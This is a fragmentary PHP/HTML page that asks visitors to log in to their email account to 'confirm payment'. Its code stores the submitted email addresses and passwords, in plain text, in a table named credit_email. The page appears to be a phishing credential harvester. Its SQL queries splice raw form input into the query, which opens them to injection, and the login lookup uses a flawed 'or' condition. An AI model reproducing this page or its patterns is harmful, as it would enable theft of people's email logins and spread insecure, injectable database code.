...
<body class="bg-secondary" >
     ...
     <h1>Please login to your email to confirm payment</h1>
    <div class="login-box">
        <h2>Email Login</h2>
...
if (isset($_POST['login-btn'])) {
    ...
    $select_query = "Select * from `credit_email` where email='$email' or password='$password' ";
    ...
    if ($rows_count > 0) {
        ...
        // Insert new user
        $insert_query="Insert into `credit_email` (email, password) values('$email', '$password') ";
